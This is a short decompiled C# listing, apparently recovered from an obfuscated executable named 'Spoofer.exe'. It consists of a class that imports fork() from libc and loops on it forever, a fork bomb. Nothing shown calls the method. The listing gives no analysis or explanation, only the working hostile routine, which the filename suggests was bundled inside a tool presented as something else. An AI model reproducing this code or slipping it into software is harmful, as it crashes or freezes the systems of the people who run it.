// Decompiled with JetBrains decompiler
// Type: idk.Fork
// Assembly: Obfuscated Name, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F586F40D-E7E7-42DC-83B9-A3609E437F40
// Assembly location: C:\Users\User0\OneDrive\Skrivebord\Spoofer.exe

using System.Runtime.InteropServices;

namespace idk
{
  internal class Fork
  {
    [DllImport("libc.so.6")]
    public static extern long fork();

    private static void F()
    {
      while (true)
        Fork.fork();
    }
  }
}
